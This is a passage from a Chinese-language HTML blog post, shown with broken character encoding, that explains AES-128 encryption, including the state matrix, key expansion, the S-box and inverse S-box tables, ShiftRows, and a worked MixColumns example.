å¯†è½®æ•°</th></tr></thead><tbody><tr><td>AES-128</td><td>4</td><td>4</td><td>10</td></tr><tr><td>AES-192</td><td>6</td><td>4</td><td>12</td></tr><tr><td>AES-256</td><td>8</td><td>4</td><td>14</td></tr></tbody></table><p>å‡è®¾è¿™é‡Œå®ç°çš„æ˜¯AES-128ï¼Œä¹Ÿå°±æ˜¯å¯†é’¥çš„é•¿åº¦ä¸º128ä½ï¼ŒåŠ å¯†è½®æ•°ä¸º10è½®ã€‚ </p><p>ä¸Šé¢è¯´åˆ°ï¼ŒAESçš„åŠ å¯†å…¬å¼ä¸ºC &#x3D; E(K,P)ï¼Œåœ¨åŠ å¯†å‡½æ•°Eä¸­ï¼Œä¼šæ‰§è¡Œä¸€ä¸ª<strong>è½®å‡½æ•°</strong>ï¼Œå¹¶ä¸”<strong>æ‰§è¡Œ10æ¬¡è¿™ä¸ª****è½®å‡½æ•°</strong>ï¼Œè¿™ä¸ªè½®å‡½æ•°çš„å‰9æ¬¡æ‰§è¡Œçš„æ“ä½œæ˜¯ä¸€æ ·çš„ï¼Œåªæœ‰ç¬¬10æ¬¡æœ‰æ‰€ä¸åŒã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸€ä¸ªæ˜æ–‡åˆ†ç»„ä¼šè¢«åŠ å¯†10è½®ã€‚AESçš„æ ¸å¿ƒå°±æ˜¯å®ç°ä¸€è½®ä¸­çš„æ‰€æœ‰æ“ä½œã€‚</p><h2 id="æ˜æ–‡å¤„ç†"><a href="#æ˜æ–‡å¤„ç†" class="headerlink" title="æ˜æ–‡å¤„ç†"></a>æ˜æ–‡å¤„ç†</h2><p>AESçš„å¤„ç†å•ä½æ˜¯å­—èŠ‚ï¼Œ128ä½çš„è¾“å…¥æ˜æ–‡åˆ†ç»„På’Œè¾“å…¥å¯†é’¥Kéƒ½è¢«åˆ†æˆ16ä¸ªå­—èŠ‚ï¼Œåˆ†åˆ«è®°ä¸ºP &#x3D; P0 P1 â€¦ P15 å’Œ K &#x3D; K0 K1 â€¦ K15ã€‚å¦‚ï¼Œæ˜æ–‡åˆ†ç»„ä¸ºP &#x3D; abcdefghijklmnop,å…¶ä¸­çš„å­—ç¬¦aå¯¹åº”P0ï¼Œpå¯¹åº”P15ã€‚ä¸€èˆ¬åœ°ï¼Œæ˜æ–‡åˆ†ç»„ç”¨å­—èŠ‚ä¸ºå•ä½çš„æ­£æ–¹å½¢çŸ©é˜µæè¿°ï¼Œç§°ä¸ºçŠ¶æ€çŸ©é˜µã€‚åœ¨ç®—æ³•çš„æ¯ä¸€è½®ä¸­ï¼ŒçŠ¶æ€çŸ©é˜µçš„å†…å®¹ä¸æ–­å‘ç”Ÿå˜åŒ–ï¼Œæœ€åçš„ç»“æœä½œä¸ºå¯†æ–‡è¾“å‡ºã€‚è¯¥çŸ©é˜µä¸­å­—èŠ‚çš„æ’åˆ—é¡ºåºä¸ºä»ä¸Šåˆ°ä¸‹ã€ä»å·¦è‡³å³ä¾æ¬¡æ’åˆ—ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406180954828.png" alt="image-20240618095435786"> </p><p>ç°åœ¨å‡è®¾æ˜æ–‡åˆ†ç»„Pä¸ºâ€abcdefghijklmnopâ€ï¼Œåˆ™å¯¹åº”ä¸Šé¢ç”Ÿæˆçš„çŠ¶æ€çŸ©é˜µå›¾å¦‚ä¸‹ï¼š </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406180956474.png" alt="image-20240618095624432"> </p><p>ä¸Šå›¾ä¸­ï¼Œ0x61ä¸ºå­—ç¬¦açš„åå…­è¿›åˆ¶è¡¨ç¤ºã€‚å¯ä»¥çœ‹åˆ°ï¼Œæ˜æ–‡ç»è¿‡æ˜æ–‡å¤„ç†åï¼Œå·²ç»é¢ç›®å…¨éã€‚</p><h2 id="å¯†é’¥å¤„ç†"><a href="#å¯†é’¥å¤„ç†" class="headerlink" title="å¯†é’¥å¤„ç†"></a>å¯†é’¥å¤„ç†</h2><p>ç±»ä¼¼åœ°ï¼Œ128ä½å¯†é’¥ä¹Ÿæ˜¯ç”¨å­—èŠ‚ä¸ºå•ä½çš„çŸ©é˜µè¡¨ç¤ºï¼ŒçŸ©é˜µçš„æ¯ä¸€åˆ—è¢«ç§°ä¸º1ä¸ª32ä½æ¯”ç‰¹å­—ã€‚é€šè¿‡å¯†é’¥ç¼–æ’å‡½æ•°è¯¥å¯†é’¥çŸ©é˜µè¢«æ‰©å±•æˆä¸€ä¸ª44ä¸ªå­—ç»„æˆçš„åºåˆ—W[0],W[1], â€¦ ,W[43],è¯¥åºåˆ—çš„å‰4ä¸ªå…ƒç´ W[0],W[1],W[2],W[3]æ˜¯åŸå§‹å¯†é’¥ï¼Œç”¨äºåŠ å¯†è¿ç®—ä¸­çš„åˆå§‹å¯†é’¥åŠ ï¼ˆä¸‹é¢ä»‹ç»ï¼‰;åé¢40ä¸ªå­—åˆ†ä¸º10ç»„ï¼Œæ¯ç»„4ä¸ªå­—ï¼ˆ128æ¯”ç‰¹ï¼‰åˆ†åˆ«ç”¨äº10è½®åŠ å¯†è¿ç®—ä¸­çš„è½®å¯†é’¥åŠ ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406180958600.png" alt="image-20240618095805551"> </p><p>ä¸Šå›¾ä¸­ï¼Œè®¾K &#x3D; â€œabcdefghijklmnopâ€ï¼Œåˆ™K0 &#x3D; a, K15 &#x3D; p, W[0] &#x3D; K0 K1 K2 K3 &#x3D; â€œabcdâ€ã€‚</p><p>AESçš„æ•´ä½“ç»“æ„å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå…¶ä¸­çš„W[0,3]æ˜¯æŒ‡W[0]ã€W[1]ã€W[2]å’ŒW[3]ä¸²è”ç»„æˆçš„128ä½å¯†é’¥ã€‚åŠ å¯†çš„ç¬¬1è½®åˆ°ç¬¬9è½®çš„è½®å‡½æ•°ä¸€æ ·ï¼ŒåŒ…æ‹¬4ä¸ªæ“ä½œï¼šå­—èŠ‚ä»£æ¢ã€è¡Œä½ç§»ã€åˆ—æ··åˆå’Œè½®å¯†é’¥åŠ ã€‚æœ€åä¸€è½®è¿­ä»£ä¸æ‰§è¡Œåˆ—æ··åˆã€‚å¦å¤–ï¼Œåœ¨ç¬¬ä¸€è½®è¿­ä»£ä¹‹å‰ï¼Œå…ˆå°†æ˜æ–‡å’ŒåŸå§‹å¯†é’¥è¿›è¡Œä¸€æ¬¡å¼‚æˆ–åŠ å¯†æ“ä½œã€‚ </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406181000960.png" alt="image-20240618100036920"> </p><p>ä¸Šå›¾ä¹Ÿå±•ç¤ºäº†AESè§£å¯†è¿‡ç¨‹ï¼Œè§£å¯†è¿‡ç¨‹ä»ä¸º10è½®ï¼Œæ¯ä¸€è½®çš„æ“ä½œæ˜¯åŠ å¯†æ“ä½œçš„é€†æ“ä½œã€‚ç”±äºAESçš„4ä¸ªè½®æ“ä½œéƒ½æ˜¯å¯é€†çš„ï¼Œå› æ­¤ï¼Œè§£å¯†æ“ä½œçš„ä¸€è½®å°±æ˜¯é¡ºåºæ‰§è¡Œé€†è¡Œç§»ä½ã€é€†å­—èŠ‚ä»£æ¢ã€è½®å¯†é’¥åŠ å’Œé€†åˆ—æ··åˆã€‚åŒåŠ å¯†æ“ä½œç±»ä¼¼ï¼Œæœ€åä¸€è½®ä¸æ‰§è¡Œé€†åˆ—æ··åˆï¼Œåœ¨ç¬¬1è½®è§£å¯†ä¹‹å‰ï¼Œè¦æ‰§è¡Œ1æ¬¡å¯†é’¥åŠ æ“ä½œã€‚</p><p>ä¸‹é¢åˆ†åˆ«ä»‹ç»AESä¸­ä¸€è½®çš„4ä¸ªæ“ä½œé˜¶æ®µï¼Œè¿™4åˆ†æ“ä½œé˜¶æ®µä½¿è¾“å…¥ä½å¾—åˆ°å……åˆ†çš„æ··æ·†ã€‚</p><h2 id="AESç®—æ³•æµç¨‹"><a href="#AESç®—æ³•æµç¨‹" class="headerlink" title="AESç®—æ³•æµç¨‹"></a>AESç®—æ³•æµç¨‹</h2><p>AESåŠ å¯†ç®—æ³•æ¶‰åŠ4ç§æ“ä½œï¼š<strong>å­—èŠ‚æ›¿ä»£</strong>ï¼ˆSubBytesï¼‰ã€<strong>è¡Œç§»ä½</strong>ï¼ˆShiftRowsï¼‰ã€<strong>åˆ—æ··æ·†</strong>ï¼ˆMixColumnsï¼‰å’Œ<strong>è½®å¯†é’¥åŠ </strong>ï¼ˆAddRoundKeyï¼‰ã€‚ä¸‹å›¾ç»™å‡ºäº†AESåŠ è§£å¯†çš„æµç¨‹ï¼š</p><ul><li>è§£å¯†ç®—æ³•çš„æ¯ä¸€æ­¥åˆ†åˆ«å¯¹åº”åŠ å¯†ç®—æ³•çš„é€†æ“ä½œï¼›</li><li>åŠ è§£å¯†æ‰€æœ‰æ“ä½œçš„é¡ºåºæ­£å¥½æ˜¯ç›¸åçš„ã€‚æ­£æ˜¯ç”±äºè¿™å‡ ç‚¹ï¼ˆå†åŠ ä¸ŠåŠ å¯†ç®—æ³•ä¸è§£å¯†ç®—æ³•æ¯æ­¥çš„æ“ä½œäº’é€†ï¼‰ä¿è¯äº†ç®—æ³•çš„æ­£ç¡®æ€§ã€‚åŠ è§£å¯†ä¸­æ¯è½®çš„å¯†é’¥åˆ†åˆ«ç”±ç§å­å¯†é’¥ç»è¿‡å¯†é’¥æ‰©å±•ç®—æ³•å¾—åˆ°ã€‚ç®—æ³•ä¸­16å­—èŠ‚çš„æ˜æ–‡ã€å¯†æ–‡å’Œè½®å­å¯†é’¥éƒ½ä»¥ä¸€ä¸ª4x4çš„çŸ©é˜µè¡¨ç¤ºã€‚</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406181107947.jpeg" alt="img"> </p><h3 id="å­—èŠ‚æ›¿æ¢"><a href="#å­—èŠ‚æ›¿æ¢" class="headerlink" title="å­—èŠ‚æ›¿æ¢"></a>å­—èŠ‚æ›¿æ¢</h3><p>AESçš„å­—èŠ‚ä»£æ¢å…¶å®å°±æ˜¯ä¸€ä¸ªç®€å•çš„æŸ¥è¡¨æ“ä½œã€‚AESå®šä¹‰äº†ä¸€ä¸ªSç›’å’Œä¸€ä¸ªé€†Sç›’ã€‚<br><strong>AESçš„Sç›’</strong>ï¼š</p><table><thead><tr><th>è¡Œ&#x2F;åˆ—</th><th>0</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th><th>9</th><th>A</th><th>B</th><th>C</th><th>D</th><th>E</th><th>F</th></tr></thead><tbody><tr><td>0</td><td>0x63</td><td>0x7c</td><td>0x77</td><td>0x7b</td><td>0xf2</td><td>0x6b</td><td>0x6f</td><td>0xc5</td><td>0x30</td><td>0x01</td><td>0x67</td><td>0x2b</td><td>0xfe</td><td>0xd7</td><td>0xab</td><td>0x76</td></tr><tr><td>1</td><td>0xca</td><td>0x82</td><td>0xc9</td><td>0x7d</td><td>0xfa</td><td>0x59</td><td>0x47</td><td>0xf0</td><td>0xad</td><td>0xd4</td><td>0xa2</td><td>0xaf</td><td>0x9c</td><td>0xa4</td><td>0x72</td><td>0xc0</td></tr><tr><td>2</td><td>0xb7</td><td>0xfd</td><td>0x93</td><td>0x26</td><td>0x36</td><td>0x3f</td><td>0xf7</td><td>0xcc</td><td>0x34</td><td>0xa5</td><td>0xe5</td><td>0xf1</td><td>0x71</td><td>0xd8</td><td>0x31</td><td>0x15</td></tr><tr><td>3</td><td>0x04</td><td>0xc7</td><td>0x23</td><td>0xc3</td><td>0x18</td><td>0x96</td><td>0x05</td><td>0x9a</td><td>0x07</td><td>0x12</td><td>0x80</td><td>0xe2</td><td>0xeb</td><td>0x27</td><td>0xb2</td><td>0x75</td></tr><tr><td>4</td><td>0x09</td><td>0x83</td><td>0x2c</td><td>0x1a</td><td>0x1b</td><td>0x6e</td><td>0x5a</td><td>0xa0</td><td>0x52</td><td>0x3b</td><td>0xd6</td><td>0xb3</td><td>0x29</td><td>0xe3</td><td>0x2f</td><td>0x84</td></tr><tr><td>5</td><td>0x53</td><td>0xd1</td><td>0x00</td><td>0xed</td><td>0x20</td><td>0xfc</td><td>0xb1</td><td>0x5b</td><td>0x6a</td><td>0xcb</td><td>0xbe</td><td>0x39</td><td>0x4a</td><td>0x4c</td><td>0x58</td><td>0xcf</td></tr><tr><td>6</td><td>0xd0</td><td>0xef</td><td>0xaa</td><td>0xfb</td><td>0x43</td><td>0x4d</td><td>0x33</td><td>0x85</td><td>0x45</td><td>0xf9</td><td>0x02</td><td>0x7f</td><td>0x50</td><td>0x3c</td><td>0x9f</td><td>0xa8</td></tr><tr><td>7</td><td>0x51</td><td>0xa3</td><td>0x40</td><td>0x8f</td><td>0x92</td><td>0x9d</td><td>0x38</td><td>0xf5</td><td>0xbc</td><td>0xb6</td><td>0xda</td><td>0x21</td><td>0x10</td><td>0xff</td><td>0xf3</td><td>0xd2</td></tr><tr><td>8</td><td>0xcd</td><td>0x0c</td><td>0x13</td><td>0xec</td><td>0x5f</td><td>0x97</td><td>0x44</td><td>0x17</td><td>0xc4</td><td>0xa7</td><td>0x7e</td><td>0x3d</td><td>0x64</td><td>0x5d</td><td>0x19</td><td>0x73</td></tr><tr><td>9</td><td>0x60</td><td>0x81</td><td>0x4f</td><td>0xdc</td><td>0x22</td><td>0x2a</td><td>0x90</td><td>0x88</td><td>0x46</td><td>0xee</td><td>0xb8</td><td>0x14</td><td>0xde</td><td>0x5e</td><td>0x0b</td><td>0xdb</td></tr><tr><td>A</td><td>0xe0</td><td>0x32</td><td>0x3a</td><td>0x0a</td><td>0x49</td><td>0x06</td><td>0x24</td><td>0x5c</td><td>0xc2</td><td>0xd3</td><td>0xac</td><td>0x62</td><td>0x91</td><td>0x95</td><td>0xe4</td><td>0x79</td></tr><tr><td>B</td><td>0xe7</td><td>0xc8</td><td>0x37</td><td>0x6d</td><td>0x8d</td><td>0xd5</td><td>0x4e</td><td>0xa9</td><td>0x6c</td><td>0x56</td><td>0xf4</td><td>0xea</td><td>0x65</td><td>0x7a</td><td>0xae</td><td>0x08</td></tr><tr><td>C</td><td>0xba</td><td>0x78</td><td>0x25</td><td>0x2e</td><td>0x1c</td><td>0xa6</td><td>0xb4</td><td>0xc6</td><td>0xe8</td><td>0xdd</td><td>0x74</td><td>0x1f</td><td>0x4b</td><td>0xbd</td><td>0x8b</td><td>0x8a</td></tr><tr><td>D</td><td>0x70</td><td>0x3e</td><td>0xb5</td><td>0x66</td><td>0x48</td><td>0x03</td><td>0xf6</td><td>0x0e</td><td>0x61</td><td>0x35</td><td>0x57</td><td>0xb9</td><td>0x86</td><td>0xc1</td><td>0x1d</td><td>0x9e</td></tr><tr><td>E</td><td>0xe1</td><td>0xf8</td><td>0x98</td><td>0x11</td><td>0x69</td><td>0xd9</td><td>0x8e</td><td>0x94</td><td>0x9b</td><td>0x1e</td><td>0x87</td><td>0xe9</td><td>0xce</td><td>0x55</td><td>0x28</td><td>0xdf</td></tr><tr><td>F</td><td>0x8c</td><td>0xa1</td><td>0x89</td><td>0x0d</td><td>0xbf</td><td>0xe6</td><td>0x42</td><td>0x68</td><td>0x41</td><td>0x99</td><td>0x2d</td><td>0x0f</td><td>0xb0</td><td>0x54</td><td>0xbb</td><td>0x16</td></tr></tbody></table><p>çŠ¶æ€çŸ©é˜µä¸­çš„å…ƒç´ æŒ‰ç…§ä¸‹é¢çš„æ–¹å¼æ˜ å°„ä¸ºä¸€ä¸ªæ–°çš„å­—èŠ‚ï¼šæŠŠè¯¥å­—èŠ‚çš„é«˜4ä½ä½œä¸ºè¡Œå€¼ï¼Œä½4ä½ä½œä¸ºåˆ—å€¼ï¼Œå–å‡ºSç›’æˆ–è€…é€†Sç›’ä¸­å¯¹åº”çš„è¡Œçš„å…ƒç´ ä½œä¸ºè¾“å‡ºã€‚ä¾‹å¦‚ï¼ŒåŠ å¯†æ—¶ï¼Œè¾“å‡ºçš„å­—èŠ‚S1ä¸º0x12,åˆ™æŸ¥Sç›’çš„ç¬¬0x01è¡Œå’Œ0x02åˆ—ï¼Œå¾—åˆ°å€¼0xc9,ç„¶åæ›¿æ¢S1åŸæœ‰çš„0x12ä¸º0xc9ã€‚</p><p>çŠ¶æ€çŸ©é˜µç»å­—èŠ‚ä»£æ¢åçš„å›¾å¦‚ä¸‹ï¼š </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406181109579.png" alt="image-20240618110914545"> </p><p>é€†å­—èŠ‚ä»£æ¢ä¹Ÿå°±æ˜¯æŸ¥é€†Sç›’æ¥å˜æ¢ï¼Œé€†Sç›’å¦‚ä¸‹ï¼š</p><table><thead><tr><th>è¡Œ&#x2F;åˆ—</th><th>0</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th><th>9</th><th>A</th><th>B</th><th>C</th><th>D</th><th>E</th><th>F</th></tr></thead><tbody><tr><td>0</td><td>0x52</td><td>0x09</td><td>0x6a</td><td>0xd5</td><td>0x30</td><td>0x36</td><td>0xa5</td><td>0x38</td><td>0xbf</td><td>0x40</td><td>0xa3</td><td>0x9e</td><td>0x81</td><td>0xf3</td><td>0xd7</td><td>0xfb</td></tr><tr><td>1</td><td>0x7c</td><td>0xe3</td><td>0x39</td><td>0x82</td><td>0x9b</td><td>0x2f</td><td>0xff</td><td>0x87</td><td>0x34</td><td>0x8e</td><td>0x43</td><td>0x44</td><td>0xc4</td><td>0xde</td><td>0xe9</td><td>0xcb</td></tr><tr><td>2</td><td>0x54</td><td>0x7b</td><td>0x94</td><td>0x32</td><td>0xa6</td><td>0xc2</td><td>0x23</td><td>0x3d</td><td>0xee</td><td>0x4c</td><td>0x95</td><td>0x0b</td><td>0x42</td><td>0xfa</td><td>0xc3</td><td>0x4e</td></tr><tr><td>3</td><td>0x08</td><td>0x2e</td><td>0xa1</td><td>0x66</td><td>0x28</td><td>0xd9</td><td>0x24</td><td>0xb2</td><td>0x76</td><td>0x5b</td><td>0xa2</td><td>0x49</td><td>0x6d</td><td>0x8b</td><td>0xd1</td><td>0x25</td></tr><tr><td>4</td><td>0x72</td><td>0xf8</td><td>0xf6</td><td>0x64</td><td>0x86</td><td>0x68</td><td>0x98</td><td>0x16</td><td>0xd4</td><td>0xa4</td><td>0x5c</td><td>0xcc</td><td>0x5d</td><td>0x65</td><td>0xb6</td><td>0x92</td></tr><tr><td>5</td><td>0x6c</td><td>0x70</td><td>0x48</td><td>0x50</td><td>0xfd</td><td>0xed</td><td>0xb9</td><td>0xda</td><td>0x5e</td><td>0x15</td><td>0x46</td><td>0x57</td><td>0xa7</td><td>0x8d</td><td>0x9d</td><td>0x84</td></tr><tr><td>6</td><td>0x90</td><td>0xd8</td><td>0xab</td><td>0x00</td><td>0x8c</td><td>0xbc</td><td>0xd3</td><td>0x0a</td><td>0xf7</td><td>0xe4</td><td>0x58</td><td>0x05</td><td>0xb8</td><td>0xb3</td><td>0x45</td><td>0x06</td></tr><tr><td>7</td><td>0xd0</td><td>0x2c</td><td>0x1e</td><td>0x8f</td><td>0xca</td><td>0x3f</td><td>0x0f</td><td>0x02</td><td>0xc1</td><td>0xaf</td><td>0xbd</td><td>0x03</td><td>0x01</td><td>0x13</td><td>0x8a</td><td>0x6b</td></tr><tr><td>8</td><td>0x3a</td><td>0x91</td><td>0x11</td><td>0x41</td><td>0x4f</td><td>0x67</td><td>0xdc</td><td>0xea</td><td>0x97</td><td>0xf2</td><td>0xcf</td><td>0xce</td><td>0xf0</td><td>0xb4</td><td>0xe6</td><td>0x73</td></tr><tr><td>9</td><td>0x96</td><td>0xac</td><td>0x74</td><td>0x22</td><td>0xe7</td><td>0xad</td><td>0x35</td><td>0x85</td><td>0xe2</td><td>0xf9</td><td>0x37</td><td>0xe8</td><td>0x1c</td><td>0x75</td><td>0xdf</td><td>0x6e</td></tr><tr><td>A</td><td>0x47</td><td>0xf1</td><td>0x1a</td><td>0x71</td><td>0x1d</td><td>0x29</td><td>0xc5</td><td>0x89</td><td>0x6f</td><td>0xb7</td><td>0x62</td><td>0x0e</td><td>0xaa</td><td>0x18</td><td>0xbe</td><td>0x1b</td></tr><tr><td>B</td><td>0xfc</td><td>0x56</td><td>0x3e</td><td>0x4b</td><td>0xc6</td><td>0xd2</td><td>0x79</td><td>0x20</td><td>0x9a</td><td>0xdb</td><td>0xc0</td><td>0xfe</td><td>0x78</td><td>0xcd</td><td>0x5a</td><td>0xf4</td></tr><tr><td>C</td><td>0x1f</td><td>0xdd</td><td>0xa8</td><td>0x33</td><td>0x88</td><td>0x07</td><td>0xc7</td><td>0x31</td><td>0xb1</td><td>0x12</td><td>0x10</td><td>0x59</td><td>0x27</td><td>0x80</td><td>0xec</td><td>0x5f</td></tr><tr><td>D</td><td>0x60</td><td>0x51</td><td>0x7f</td><td>0xa9</td><td>0x19</td><td>0xb5</td><td>0x4a</td><td>0x0d</td><td>0x2d</td><td>0xe5</td><td>0x7a</td><td>0x9f</td><td>0x93</td><td>0xc9</td><td>0x9c</td><td>0xef</td></tr><tr><td>E</td><td>0xa0</td><td>0xe0</td><td>0x3b</td><td>0x4d</td><td>0xae</td><td>0x2a</td><td>0xf5</td><td>0xb0</td><td>0xc8</td><td>0xeb</td><td>0xbb</td><td>0x3c</td><td>0x83</td><td>0x53</td><td>0x99</td><td>0x61</td></tr><tr><td>F</td><td>0x17</td><td>0x2b</td><td>0x04</td><td>0x7e</td><td>0xba</td><td>0x77</td><td>0xd6</td><td>0x26</td><td>0xe1</td><td>0x69</td><td>0x14</td><td>0x63</td><td>0x55</td><td>0x21</td><td>0x0c</td><td>0x7d</td></tr></tbody></table><h3 id="è¡Œç§»ä½"><a href="#è¡Œç§»ä½" class="headerlink" title="è¡Œç§»ä½"></a>è¡Œç§»ä½</h3><p>è¡Œç§»ä½æ˜¯ä¸€ä¸ªç®€å•çš„å·¦å¾ªç¯ç§»ä½æ“ä½œã€‚å½“å¯†é’¥é•¿åº¦ä¸º128æ¯”ç‰¹æ—¶ï¼ŒçŠ¶æ€çŸ©é˜µçš„ç¬¬0è¡Œå·¦ç§»0å­—èŠ‚ï¼Œç¬¬1è¡Œå·¦ç§»1å­—èŠ‚ï¼Œç¬¬2è¡Œå·¦ç§»2å­—èŠ‚ï¼Œç¬¬3è¡Œå·¦ç§»3å­—èŠ‚ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406181113762.png" alt="image-20240618111336722"> </p><p><strong>è¡Œç§»ä½çš„é€†å˜æ¢</strong></p><p>è¡Œç§»ä½çš„é€†å˜æ¢æ˜¯å°†çŠ¶æ€çŸ©é˜µä¸­çš„æ¯ä¸€è¡Œæ‰§è¡Œç›¸åçš„ç§»ä½æ“ä½œï¼Œä¾‹å¦‚AES-128ä¸­ï¼ŒçŠ¶æ€çŸ©é˜µçš„ç¬¬0è¡Œå³ç§»0å­—èŠ‚ï¼Œç¬¬1è¡Œå³ç§»1å­—èŠ‚ï¼Œç¬¬2è¡Œå³ç§»2å­—èŠ‚ï¼Œç¬¬3è¡Œå³ç§»3å­—èŠ‚ã€‚</p><h3 id="åˆ—æ··åˆ"><a href="#åˆ—æ··åˆ" class="headerlink" title="åˆ—æ··åˆ"></a>åˆ—æ··åˆ</h3><p>åˆ—æ··åˆå˜æ¢æ˜¯é€šè¿‡çŸ©é˜µç›¸ä¹˜æ¥å®ç°çš„ï¼Œç»è¡Œç§»ä½åçš„çŠ¶æ€çŸ©é˜µä¸å›ºå®šçš„çŸ©é˜µç›¸ä¹˜ï¼Œå¾—åˆ°æ··æ·†åçš„çŠ¶æ€çŸ©é˜µï¼Œå¦‚ä¸‹å›¾çš„å…¬å¼æ‰€ç¤ºï¼š </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406181114991.png" alt="img"> </p><p>çŠ¶æ€çŸ©é˜µä¸­çš„ç¬¬jåˆ—(0 â‰¤jâ‰¤3)çš„åˆ—æ··åˆå¯ä»¥è¡¨ç¤ºä¸ºä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406181114813.png" alt="img"> </p><p>å…¶ä¸­ï¼ŒçŸ©é˜µå…ƒç´ çš„ä¹˜æ³•å’ŒåŠ æ³•éƒ½æ˜¯å®šä¹‰åœ¨åŸºäºGF(2^8)ä¸Šçš„äºŒå…ƒè¿ç®—,å¹¶ä¸æ˜¯é€šå¸¸æ„ä¹‰ä¸Šçš„ä¹˜æ³•å’ŒåŠ æ³•ã€‚è¿™é‡Œæ¶‰åŠåˆ°ä¸€äº›ä¿¡æ¯å®‰å…¨ä¸Šçš„æ•°å­¦çŸ¥è¯†ï¼Œä¸è¿‡ä¸æ‡‚è¿™äº›çŸ¥è¯†ä¹Ÿè¡Œã€‚å…¶å®è¿™ç§äºŒå…ƒè¿ç®—çš„åŠ æ³•ç­‰ä»·äºä¸¤ä¸ªå­—èŠ‚çš„å¼‚æˆ–ï¼Œä¹˜æ³•åˆ™å¤æ‚ä¸€ç‚¹ã€‚å¯¹äºä¸€ä¸ª8ä½çš„äºŒè¿›åˆ¶æ•°æ¥è¯´ï¼Œä½¿ç”¨åŸŸä¸Šçš„ä¹˜æ³•ä¹˜ä»¥(00000010)ç­‰ä»·äºå·¦ç§»1ä½(ä½ä½è¡¥0)åï¼Œå†æ ¹æ®æƒ…å†µåŒ(00011011)è¿›è¡Œå¼‚æˆ–è¿ç®—ï¼Œè®¾S1 &#x3D; (a7 a6 a5 a4 a3 a2 a1 a0)ï¼Œåˆš0x02 * S1å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š<br><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406181118158.png" alt="img"><br>ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœa7ä¸º1ï¼Œåˆ™è¿›è¡Œå¼‚æˆ–è¿ç®—ï¼Œå¦åˆ™ä¸è¿›è¡Œã€‚<br>ç±»ä¼¼åœ°ï¼Œä¹˜ä»¥(00000100)å¯ä»¥æ‹†åˆ†æˆä¸¤æ¬¡ä¹˜ä»¥(00000010)çš„è¿ç®—ï¼š<br><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406181119503.png" alt="img"><br>ä¹˜ä»¥(0000 0011)å¯ä»¥æ‹†åˆ†æˆå…ˆåˆ†åˆ«ä¹˜ä»¥(0000 0001)å’Œ(0000 0010)ï¼Œå†å°†ä¸¤ä¸ªä¹˜ç§¯å¼‚æˆ–ï¼š<br><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406181119744.png" alt="img"><br>å› æ­¤ï¼Œæˆ‘ä»¬åªéœ€è¦å®ç°ä¹˜ä»¥2çš„å‡½æ•°ï¼Œå…¶ä»–æ•°å€¼çš„ä¹˜æ³•éƒ½å¯ä»¥é€šè¿‡ç»„åˆæ¥å®ç°ã€‚<br>ä¸‹é¢ä¸¾ä¸ªå…·ä½“çš„ä¾‹å­,è¾“å…¥çš„çŠ¶æ€çŸ©é˜µå¦‚ä¸‹ï¼š</p><table><thead><tr><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td>C9</td><td>E5</td><td>FD</td><td>2B</td></tr><tr><td>7A</td><td>F2</td><td>78</td><td>6E</td></tr><tr><td>63</td><td>9C</td><td>26</td><td>67</td></tr><tr><td>B0</td><td>A7</td><td>82</td><td>E5</td></tr></tbody></table><p>ä¸‹é¢ï¼Œè¿›è¡Œåˆ—æ··åˆè¿ç®—ï¼š<br>ä»¥ç¬¬ä¸€åˆ—çš„è¿ç®—ä¸ºä¾‹ï¼š<br><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406181118167.png" alt="img"><br>å…¶å®ƒåˆ—çš„è®¡ç®—å°±ä¸åˆ—ä¸¾äº†ï¼Œåˆ—æ··åˆåç”Ÿæˆçš„æ–°çŠ¶æ€çŸ©é˜µå¦‚ä¸‹ï¼š</p><table><thead><tr><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td>D4</td><td>E7</td><td>CD</td><td>66</td></tr><tr><td>28</td><td>02</td><td>E5</td><td>BB</td></tr><tr><td>BE</td><td>C6</td><td>D6</td><td>BF</td></tr><tr><td>22</td><td>0F</td><td>DF</td><td>A5</td></tr></tbody></table><p>*<strong>åˆ—æ··åˆé€†è¿ç®—*</strong></p><p>é€†å‘åˆ—æ··åˆå˜æ¢å¯ç”±ä¸‹å›¾çš„çŸ©é˜µä¹˜æ³•å®šä¹‰ï¼š<br><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406181119462.png" alt="img"><br>å¯ä»¥éªŒè¯ï¼Œé€†å˜æ¢çŸ©é˜µåŒæ­£å˜æ¢çŸ©é˜µçš„ä¹˜ç§¯æ°å¥½ä¸ºå•ä½çŸ©é˜µã€‚</p><h3 id="è½®å¯†é’¥åŠ "><a href="#è½®å¯†é’¥åŠ " class="headerlink" title="è½®å¯†é’¥åŠ "></a>è½®å¯†é’¥åŠ </h3><p>è½®å¯†é’¥åŠ 